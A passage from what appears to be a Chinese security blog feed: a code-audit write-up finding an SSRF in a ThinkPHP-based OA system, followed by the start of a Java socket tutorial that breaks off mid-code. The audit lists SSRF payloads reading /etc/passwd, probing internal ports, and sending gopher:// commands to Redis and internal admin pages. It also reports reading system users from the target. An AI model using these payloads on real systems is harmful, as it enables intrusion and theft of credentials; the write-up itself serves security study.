        <content type="html"><![CDATA[<p><a href="https://www.dkewl.com/code/detail3016.html">https://www.dkewl.com/code/detail3016.html</a></p><h2 id="直接看后端源码"><a href="#直接看后端源码" class="headerlink" title="直接看后端源码"></a>直接看后端源码</h2><p>很清楚的有个thinkphp<br>ThinkPHP 是一个国内流行的 PHP 框架，主要用于快速开发中小型应用，尤其是为国内 PHP 开发者设计。它以高效、简单、灵活和轻量级为特点，支持 MVC 模式（Model-View-Controller），并且易于扩展和修改。以下是对 ThinkPHP 框架结构和核心内容的详细介绍：</p><h3 id="1-目录结构"><a href="#1-目录结构" class="headerlink" title="1. 目录结构"></a>1. 目录结构</h3><p>在 ThinkPHP 框架中，目录结构大体如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">项目根目录</span><br><span class="line">├── application/       # 应用目录，主要放置项目的业务逻辑代码</span><br><span class="line">│   ├── common/        # 公共模块，存放公共函数、类库等</span><br><span class="line">│   ├── config/        # 配置文件目录</span><br><span class="line">│   ├── controller/    # 控制器目录，MVC 中的 Controller</span><br><span class="line">│   ├── model/         # 模型目录，MVC 中的 Model</span><br><span class="line">│   ├── view/          # 视图目录，MVC 中的 View</span><br><span class="line">│   ├── route/         # 路由文件目录</span><br><span class="line">│   └── ...</span><br><span class="line">├── extend/            # 扩展目录，存放第三方库或自定义扩展</span><br><span class="line">├── public/            # Web 根目录，存放入口文件和静态资源</span><br><span class="line">├── runtime/           # 运行时目录，存放缓存、日志等文件</span><br><span class="line">└── thinkphp/          # 核心框架文件目录</span><br></pre></td></tr></table></figure><p>每个目录的主要作用如下：</p><ul><li><strong>application</strong>：项目的主应用目录，包含所有业务逻辑。</li><li><strong>common</strong>：项目的公共模块，适用于多个模块之间共享的内容。</li><li><strong>config</strong>：存放项目的全局配置文件。</li><li><strong>controller</strong>：控制器目录，负责接收请求并调用模型处理数据。</li><li><strong>model</strong>：模型目录，负责数据处理和业务逻辑。</li><li><strong>view</strong>：视图目录，负责展示数据。</li><li><strong>route</strong>：存放路由文件，定义 URL 路由规则。</li><li><strong>extend</strong>：可扩展的目录，可以放入第三方库或自定义类库。</li><li><strong>public</strong>：Web 访问目录，入口文件（如 <code>index.php</code>）放置在此。</li><li><strong>runtime</strong>：运行时目录，存放缓存和日志文件。</li><li><strong>thinkphp</strong>：ThinkPHP 框架的核心文件。</li></ul><h3 id="2-ThinkPHP-核心结构"><a href="#2-ThinkPHP-核心结构" class="headerlink" title="2. ThinkPHP 核心结构"></a>2. ThinkPHP 核心结构</h3><p>ThinkPHP 框架主要由以下几个核心模块组成：</p><h4 id="1-控制器（Controller）"><a href="#1-控制器（Controller）" class="headerlink" title="1) 控制器（Controller）"></a>1) 控制器（Controller）</h4><p>控制器是 MVC 模式中的 “C”，是用户请求的直接接收者。ThinkPHP 中的控制器通常继承自 <code>Think\Controller</code>，并通过 URL 调用。一个简单的控制器文件结构如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello, ThinkPHP!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-模型（Model）"><a href="#2-模型（Model）" class="headerlink" title="2) 模型（Model）"></a>2) 模型（Model）</h4><p>模型是 MVC 模式中的 “M”，用于处理数据逻辑、数据库操作等。ThinkPHP 使用 ORM（对象关系映射）方式处理数据库数据。通常模型类继承自 <code>think\Model</code>，并使用简单的语法完成数据库操作：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Model</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 可以定义数据表的额外操作或业务逻辑</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>常用方法包括 <code>find()</code>、<code>select()</code>、<code>insert()</code>、<code>update()</code> 等。</p><h4 id="3-视图（View）"><a href="#3-视图（View）" class="headerlink" title="3) 视图（View）"></a>3) 视图（View）</h4><p>视图是 MVC 模式中的 “V”，负责显示数据给用户。ThinkPHP 支持多种模板引擎，如原生的 PHP、Smarty、Twig 等，默认使用 ThinkPHP 自带的模板引擎。视图文件一般是 <code>.html</code> 文件，位于 <code>view</code> 目录中，通过控制器进行调用渲染：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fetch</span>(<span class="string">&#x27;index&#x27;</span>); <span class="comment">// 渲染 index.html</span></span><br></pre></td></tr></table></figure><h4 id="4-配置（Config）"><a href="#4-配置（Config）" class="headerlink" title="4) 配置（Config）"></a>4) 配置（Config）</h4><p>ThinkPHP 使用配置文件进行环境的控制。配置文件主要位于 <code>application/config.php</code>，可以配置数据库、缓存、路由等信息。配置支持数组格式，且可以按需覆盖：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="comment">// 数据库配置</span></span><br><span class="line">    <span class="string">&#x27;database&#x27;</span> =&gt; [</span><br><span class="line">        <span class="string">&#x27;type&#x27;</span>     =&gt; <span class="string">&#x27;mysql&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;hostname&#x27;</span> =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;database&#x27;</span> =&gt; <span class="string">&#x27;test_db&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;hostport&#x27;</span> =&gt; <span class="string">&#x27;3306&#x27;</span>,</span><br><span class="line">    ],</span><br><span class="line">    <span class="comment">// 路由配置</span></span><br><span class="line">    <span class="string">&#x27;route&#x27;</span>    =&gt; [</span><br><span class="line">        <span class="string">&#x27;pathinfo_depr&#x27;</span> =&gt; <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    ],</span><br><span class="line">];</span><br></pre></td></tr></table></figure><h4 id="5-路由（Route）"><a href="#5-路由（Route）" class="headerlink" title="5) 路由（Route）"></a>5) 路由（Route）</h4><p>路由用于定义 URL 访问模式。ThinkPHP 支持 RESTful 风格的路由，并提供灵活的 URL 定义方式。路由配置文件一般位于 <code>route</code> 目录中，定义 URL 到控制器方法的映射：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">facade</span>\<span class="title">Route</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义简单路由</span></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">rule</span>(<span class="string">&#x27;hello/:name&#x27;</span>, <span class="string">&#x27;index/index/hello&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="针对这个源代码分析"><a href="#针对这个源代码分析" class="headerlink" title="针对这个源代码分析"></a>针对这个源代码分析</h3><ol><li>**<code>404.html</code>**：通常是自定义的 404 错误页面。</li><li>**<code>数据库.sql</code>**：数据库文件，包含初始化或结构数据。</li><li>**<code>composer.json</code> 和 <code>composer.lock</code>**：Composer 依赖管理文件，说明该框架使用 Composer 来管理 PHP 包。</li><li>**<code>index.php</code>**：通常是入口文件，用于接收请求并启动框架。</li><li>**<code>log.json</code>**：可能是日志文件，记录框架操作信息。</li><li>**<code>README.txt</code>**：说明文件，可能包含关于框架的基本信息和使用说明。</li><li>**<code>sql.txt</code>**：另一份 SQL 文件，可能包含不同的数据库表结构或数据。</li><li>**<code>version.php</code>**：版本控制文件，标记当前框架版本。</li><li>**<code>.htaccess</code>**：Apache 配置文件，用于 URL 重写或其他配置。</li></ol><p>从目录结构来看，这个基于 ThinkPHP 二次开发的框架包含以下重要目录：</p><ol><li>**<code>addons</code>**：通常是插件或扩展模块的目录，用于增强框架的功能。</li><li>**<code>application</code>**：主要应用程序目录，包含核心业务逻辑代码（如控制器、模型、视图）。</li><li>**<code>attachs</code>**：一般用于存储附件或上传的文件。</li><li>**<code>data</code>**：用于存储数据文件，如缓存、日志等。</li><li>**<code>lang</code>**：语言包目录，支持多语言功能。</li><li>**<code>runtime</code>**：运行时目录，存储缓存和临时文件。</li><li>**<code>static</code>**：静态资源目录，包含 CSS、JavaScript 和图片等前端资源。</li><li>**<code>thinkphp</code>**：框架核心文件，包含 ThinkPHP 的原始文件和库。</li><li>**<code>vendor</code>**：第三方依赖目录，由 Composer 管理的 PHP 包通常存放在这里。</li></ol><p><code>application</code> 目录包含了一些主要配置文件和核心业务模块：</p><ol><li><p><strong>配置文件</strong>：</p><ul><li><strong><code>command.php</code><strong>、</strong><code>common.php</code><strong>、</strong><code>config.php</code><strong>、</strong><code>crons.php</code><strong>、</strong><code>database.php</code><strong>、</strong><code>route.php</code><strong>、</strong><code>tags.php</code></strong> 等文件，用于配置框架的核心功能，包括数据库、路由、计划任务等。</li></ul></li><li><p><strong>业务模块</strong>：</p><ul><li>**<code>admin/behavior</code>**：可能定义了行为扩展或中间件，例如 <strong><code>Cron.php</code></strong> 文件，可能用于定时任务的行为控制。</li><li>**<code>admin/controller</code>**：包含控制器文件，例如 <strong><code>Ad.php</code></strong> 和 **<code>Admin.php</code>**，负责后台管理功能的业务逻辑。</li></ul></li></ol><h2 id="SSRF-漏洞点"><a href="#SSRF-漏洞点" class="headerlink" title="SSRF 漏洞点"></a>SSRF 漏洞点</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. CURL相关</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>()</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 文件操作相关</span></span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>()</span><br><span class="line"><span class="title function_ invoke__">fopen</span>()</span><br><span class="line"><span class="title function_ invoke__">readfile</span>()</span><br><span class="line"><span class="title function_ invoke__">file</span>()</span><br><span class="line"><span class="title function_ invoke__">fread</span>()</span><br><span class="line"><span class="title function_ invoke__">fgets</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 图片处理相关</span></span><br><span class="line"><span class="title function_ invoke__">imagecreatefromurl</span>()</span><br><span class="line"><span class="title function_ invoke__">getimagesize</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 其他网络操作</span></span><br><span class="line"><span class="title function_ invoke__">fsockopen</span>()</span><br><span class="line"><span class="title function_ invoke__">socket_connect</span>()</span><br><span class="line"><span class="title function_ invoke__">stream_socket_client</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. XML相关</span></span><br><span class="line"><span class="title function_ invoke__">simplexml_load_file</span>()</span><br><span class="line"><span class="title class_">DOMDocument</span>::<span class="title function_ invoke__">load</span>()</span><br><span class="line"><span class="title class_">XMLReader</span>::<span class="title function_ invoke__">open</span>()</span><br></pre></td></tr></table></figure><p>PHP中可能有上述函数存在SSRF，检索<code>curl_setopt()</code>，发现使用的地方还是挺多的。<br><img src="/2024/11/01/WebSecurity/codeaudit/randomfileread/image.png"><br>但重点关注 application 目录下的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getaccess_token</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$config</span> = <span class="title function_ invoke__">model</span>(<span class="string">&#x27;Setting&#x27;</span>)-&gt;<span class="title function_ invoke__">fetchAll2</span>();</span><br><span class="line">       <span class="variable">$url</span> = <span class="string">&quot;https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&amp;appid=&quot;</span> . <span class="variable">$config</span>[<span class="string">&#x27;wxapp&#x27;</span>][<span class="string">&#x27;appid&#x27;</span>] . <span class="string">&quot;&amp;secret=&quot;</span> . <span class="variable">$config</span>[<span class="string">&#x27;wxapp&#x27;</span>][<span class="string">&#x27;appsecret&#x27;</span>] . <span class="string">&quot;&quot;</span>;</span><br><span class="line">       <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">       <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">       <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">       <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="number">0</span>);</span><br><span class="line">       <span class="variable">$data</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">       <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">       <span class="variable">$data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$data</span>, <span class="literal">true</span>);</span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$data</span>[<span class="string">&#x27;access_token&#x27;</span>];</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>这是第一处的，发现没有参数可控，放弃了。<br>第二处，url是可控的，直接实现任意文件读取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">httpRequest</span>(<span class="params"><span class="variable">$url</span>,<span class="variable">$data</span> = <span class="literal">null</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$curl</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>,CURLOPT_URL,<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>,CURLOPT_SSL_VERIFYPEER,<span class="literal">FALSE</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>,CURLOPT_SSL_VERIFYHOST,<span class="literal">FALSE</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>,CURLOPT_POST,<span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>,CURLOPT_POSTFIELDS,<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>,CURLOPT_RETURNTRANSFER,<span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>,CURLOPT_RETURNTRANSFER,<span class="number">1</span>);</span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curl</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$curl</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>SSRF 漏洞可能导致的危害：</p><h3 id="1-读取服务器本地文件（使用-file-协议）"><a href="#1-读取服务器本地文件（使用-file-协议）" class="headerlink" title="1. 读取服务器本地文件（使用 file:// 协议）"></a>1. 读取服务器本地文件（使用 <code>file://</code> 协议）</h3><p>攻击者可以利用 <code>file://</code> 协议来读取服务器上的本地文件。通过指定 <code>file://</code> 协议，攻击者可以访问系统中的敏感文件，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">httpRequest(&quot;file:///etc/passwd&quot;);</span><br><span class="line">httpRequest(&quot;file:///C:/Windows/system32/drivers/etc/hosts&quot;);</span><br></pre></td></tr></table></figure><p>这类请求可以泄露操作系统配置文件、密码文件等敏感信息，帮助攻击者进一步攻击或发现漏洞。</p><h3 id="2-探测内网主机和端口"><a href="#2-探测内网主机和端口" class="headerlink" title="2. 探测内网主机和端口"></a>2. 探测内网主机和端口</h3><p>SSRF 可以让攻击者通过请求不同的内网 IP 地址和端口，对内部网络进行端口扫描，从而了解网络拓扑结构。例如，攻击者可以通过请求内网地址来发现哪些服务在运行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">httpRequest(&quot;http://192.168.0.1:22&quot;);  // 尝试连接 SSH 服务</span><br><span class="line">httpRequest(&quot;http://192.168.0.1:3306&quot;); // 尝试连接数据库</span><br></pre></td></tr></table></figure><h3 id="3-访问内网服务"><a href="#3-访问内网服务" class="headerlink" title="3. 访问内网服务"></a>3. 访问内网服务</h3><p>SSRF 漏洞允许攻击者访问内网中的受保护服务和 API，这些服务通常不对外开放。例如，企业内部的管理面板、数据库接口或其他敏感系统。攻击者可以通过指定内网地址，利用 SSRF 请求来与这些服务通信，从而获取敏感数据或执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">httpRequest(&quot;http://127.0.0.1:8080/admin&quot;);</span><br><span class="line">httpRequest(&quot;http://192.168.1.2:5000/internal-api&quot;);</span><br></pre></td></tr></table></figure><h3 id="4-绕过防火墙限制"><a href="#4-绕过防火墙限制" class="headerlink" title="4. 绕过防火墙限制"></a>4. 绕过防火墙限制</h3><p>很多情况下，服务器所在的防火墙策略会禁止直接访问外部网络，但允许服务器与内网通信。SSRF 漏洞使得攻击者能够通过服务器发出请求，绕过防火墙限制访问内网或其他受保护资源。<br>例如，如果服务器在 DMZ 区域（外网与内网之间的隔离区），攻击者可能利用 SSRF 绕过 DMZ，直接访问内网资源，这会带来严重的安全威胁。</p><h3 id="5-利用特定协议"><a href="#5-利用特定协议" class="headerlink" title="5. 利用特定协议"></a>5. 利用特定协议</h3><p>利用 <code>file://</code>、<code>dict://</code>、<code>gopher://</code> 等协议的 SSRF 攻击可以带来严重的安全威胁，尤其是在服务器支持这些协议的情况下。以下是这些协议的具体利用方式及可能带来的危害：</p><p><code>file://</code> 协议，攻击者可以访问服务器上的本地文件并读取其内容。这对系统中的敏感文件（如配置文件、密码文件等）构成直接威胁。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">httpRequest(&quot;file:///etc/passwd&quot;);  // 读取 Linux 系统上的用户信息文件</span><br><span class="line">httpRequest(&quot;file:///C:/Windows/system32/drivers/etc/hosts&quot;);  // 读取 Windows 系统的 hosts 文件</span><br></pre></td></tr></table></figure><p><code>dict://</code> 协议是一个用于查询字典服务器的协议。在 SSRF 攻击中，攻击者可以利用它来发起对特定端口的请求，以便执行端口扫描或请求未授权的服务。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">httpRequest(&quot;dict://127.0.0.1:3306&quot;);  // 可能用于检测数据库服务</span><br><span class="line">httpRequest(&quot;dict://internal-service.local:11211&quot;);  // 检测内网 memcached 服务</span><br></pre></td></tr></table></figure><p><code>gopher://</code> 协议是一种较老的协议，但在 SSRF 攻击中非常强大，因为它可以创建任意的 TCP 连接。攻击者可以利用它构造复杂的请求，比如向数据库、Redis、HTTP 服务等发送自定义指令。示例包括：</p><ul><li><p><strong>Redis 未授权访问</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httpRequest(&quot;gopher://127.0.0.1:6379/_SET%20test%20&#x27;hello&#x27;&quot;);</span><br></pre></td></tr></table></figure><p>通过构造 <code>gopher://</code> 请求，攻击者可以直接向 Redis 发送命令，可能导致数据篡改、配置更改甚至持久化攻击脚本。</p></li><li><p><strong>HTTP 请求劫持</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httpRequest(&quot;gopher://internal-api.local:80/_GET%20/admin%20HTTP/1.1%0AHost:internal-api.local%0A&quot;);</span><br></pre></td></tr></table></figure><p>通过 <code>gopher://</code> 协议构造 HTTP 请求，可以让服务器向内网的 HTTP 服务发送请求，访问管理员页面或内部接口。</p></li></ul><p>除以上常见协议外，许多系统可能还支持其他协议，攻击者可以利用它们来实现多种攻击效果。例如：</p><ul><li>**<code>ftp://</code>**：攻击者可以尝试连接 FTP 服务，探测是否存在未授权访问，甚至下载或上传文件。</li><li>**<code>http://</code> 与 <code>https://</code>**：可以访问服务器内部接口、管理页面、API 等。</li><li>**<code>ldap://</code>**：如果服务器支持 LDAP 连接，攻击者可能尝试利用此协议连接目录服务以收集内部用户信息。</li></ul><p>验证：<br><img src="/2024/11/01/WebSecurity/codeaudit/randomfileread/image-1.png" alt="探测出数据库版本"></p><h2 id="进一步渗透"><a href="#进一步渗透" class="headerlink" title="进一步渗透"></a>进一步渗透</h2><p><a href="https://blog.csdn.net/Yb528970805/article/details/132853787">https://blog.csdn.net/Yb528970805/article/details/132853787</a><br><a href="https://www.freebuf.com/articles/web/337617.html">https://www.freebuf.com/articles/web/337617.html</a><br><a href="https://www.freebuf.com/articles/web/371127.html">https://www.freebuf.com/articles/web/371127.html</a></p><p>可以利用ssrf进行文件读取，尝试进行进一步渗透搜集<br><img src="/2024/11/01/WebSecurity/codeaudit/randomfileread/image-2.png"><br>可以看到后端还是有很多服务的<br>www (UID 1000) Web server user Home: &#x2F;home&#x2F;www<br>mysql (UID 1001) Database service user Home: &#x2F;home&#x2F;mysql<br>springboot (UID 1002) Java application user Home: &#x2F;home&#x2F;springboot<br>redis (UID 1003) Redis service user Home: &#x2F;home&#x2F;redis</p><p><img src="/2024/11/01/WebSecurity/codeaudit/randomfileread/image-3.png" alt="报错"></p><p>尝试读了一些其他的文件，也不太行，就拐回去看源码了<br>分析源码可以看到配置文件里的 数据库帐号密码、公众和secretKey</p>]]></content>
      
      
      <categories>
          
          <category> Code Audit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> OA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Java开发】网络编程</title>
      <link href="/2024/11/01/code/javanetwork/"/>
      <url>/2024/11/01/code/javanetwork/</url>
      
        <content type="html"><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>域名解析服务器 DNS 负责把域名翻译成对应的 IP，客户端再根据 IP 地址访问服务器。可以使用<code>nslookup</code>查看域名对应的IP地址。</p><ul><li>应用层，提供应用程序之间的通信；</li><li>表示层：处理数据格式，加解密等等；</li><li>会话层：负责建立和维护会话；</li><li>传输层：负责提供端到端的可靠传输；</li><li>网络层：负责根据目标地址选择路由来传输数据；</li><li>链路层和物理层负责把数据进行分片并且真正通过物理网络传输，例如，无线网、光纤等。</li></ul><p>互联网实际使用的 TCP&#x2F;IP 模型并不是对应到 OSI 的 7 层模型，而是大致对应 OSI 的 5 层模型：<br><img src="/2024/11/01/code/javanetwork/image.png"></p><h3 id="常见协议"><a href="#常见协议" class="headerlink" title="常见协议"></a>常见协议</h3><p>IP 协议是一个分组交换，它不保证可靠传输。而 TCP 协议是传输控制协议，它是面向连接的协议，支持可靠传输和双向通信。TCP 协议是建立在 IP 协议之上的，简单地说，IP 协议只负责发数据包，不保证顺序和正确性，而 TCP 协议负责控制数据包传输，它在传输数据之前需要先建立连接，建立连接后才能传输数据，传输完后还需要断开连接。TCP 协议之所以能保证数据的可靠传输，是通过接收确认、超时重传这些机制实现的。并且，TCP 协议允许双向通信，即通信双方可以同时发送和接收数据。</p><p>TCP 协议也是应用最广泛的协议，许多高级协议都是建立在 TCP 协议之上的，例如 HTTP、SMTP 等。<br>TCP（传输控制协议）和 IP（互联网协议）通常一起使用，被称为 TCP&#x2F;IP 协议。</p><p>TCP&#x2F;IP 协议栈分为四层：应用层、传输层、网络层和链路层。IP 协议位于网络层，负责将数据包从源主机路由到目标主机；TCP 协议位于传输层，负责在源主机和目标主机之间建立可靠的连接并确保数据的有序传输。<br><img src="/2024/11/01/code/javanetwork/image-1.png"></p><p>UDP 协议（User Datagram Protocol）是一种数据报文协议，它是无连接协议，不保证可靠传输。因为 UDP 协议在通信前不需要建立连接，因此它的传输效率比 TCP 高，而且 UDP 协议比 TCP 协议要简单得多。<br><img src="/2024/11/01/code/javanetwork/image-2.png"></p><h2 id="Java-Socket"><a href="#Java-Socket" class="headerlink" title="Java Socket"></a>Java Socket</h2><p>套接字（Socket）是一个抽象层，应用程序可以通过它发送或接收数据；就像操作文件那样可以打开、读写和关闭。套接字允许应用程序将 I&#x2F;O 应用于网络中，并与其他应用程序进行通信。网络套接字是 IP 地址与端口的组合。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> (<span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Socket</span>(<span class="string">&quot;bbs.newsmth.net&quot;</span>, <span class="number">23</span>);) &#123;</span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> socket.getInputStream();</span><br><span class="line">    <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(is, <span class="string">&quot;gbk&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (scanner.hasNextLine()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> scanner.nextLine();</span><br><span class="line">        System.out.println(line);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (UnknownHostException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span 